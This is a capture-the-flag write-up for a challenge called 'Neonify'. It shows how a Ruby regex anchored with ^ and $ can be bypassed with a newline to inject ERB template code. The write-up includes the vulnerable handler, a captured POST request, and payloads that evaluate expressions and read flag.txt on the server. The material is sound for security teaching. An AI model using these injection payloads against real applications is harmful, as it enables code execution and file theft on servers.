# Neonify Challenge - Exploiting Ruby Regex

We are faced with a site with a text box.

Whatever we type in the text box will show up below with a glow affect.

We are also provided with the website's backend files, which are written in ruby.

Nothing interesting is found in GoBuster, and Nmap isn't used in challenges.

While poking around the files we find __neon.rb__, and inside it the function that processes the text we provide in the text box, and we see our input goes through a regex:
```rb

  post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end

end 
```
```^``` and ```$``` are known as dangerous Regex characters in ruby, as they only match until a new line character.

With that we can find our plan - Write a string that will match the Regex, add a new line at the end and then add a payload, which int this case will be a ruby script.

Let's fire up BurpSuite and get going. We capture a sample POST request, and we see there is a parameter called ```neon``` which we will use to deliver the payload.

```http
POST / HTTP/1.1

Host: 178.62.74.235:31790

Content-Length: 8

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://178.62.74.235:31790

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://178.62.74.235:31790/

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.9

Connection: close



neon=abc
```

First we test ```abc\n<%= 7*7 %>```,  so lets try and URL-Encode it.
We get 49 so we achieved code execution. From here we just need to print out the flag.

From looking at the files we find the flag in the same directory so our payload will look like this   
```abc\n<%= File.read("flag.txt") %>```. Let's URL encode it and see if it works.

And we got the flag.
